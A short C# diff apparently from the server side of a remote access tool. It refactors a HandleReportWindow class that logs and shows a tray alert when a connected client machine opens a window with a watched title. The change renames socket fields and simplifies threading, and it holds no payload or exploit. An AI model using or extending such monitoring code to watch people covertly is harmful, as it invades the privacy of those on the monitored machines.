@@ -1,4 +1,4 @@
-﻿using Server.Sockets;
+﻿using Server.Connection;
 using System;
 using System.Collections.Generic;
 using System.Drawing;
@@ -13,17 +13,11 @@ namespace Server.Handle_Packet
     {
         public HandleReportWindow(Clients client, string title)
         {
-            new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} Opened [{title}]", Color.Blue);
-            if (Program.form1.InvokeRequired)
+            new HandleLogs().Addmsg($"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} Opened [{title}]", Color.Blue);
+            if (Properties.Settings.Default.Notification == true)
             {
-                Program.form1.BeginInvoke((MethodInvoker)(() =>
-                {
-                    if (Properties.Settings.Default.Notification == true)
-                    {
-                        Program.form1.notifyIcon1.BalloonTipText = $"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} Opened [{title}]";
-                        Program.form1.notifyIcon1.ShowBalloonTip(100);
-                    }
-                }));
+                Program.form1.notifyIcon1.BalloonTipText = $"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} Opened [{title}]";
+                Program.form1.notifyIcon1.ShowBalloonTip(100);
             }
         }
     }
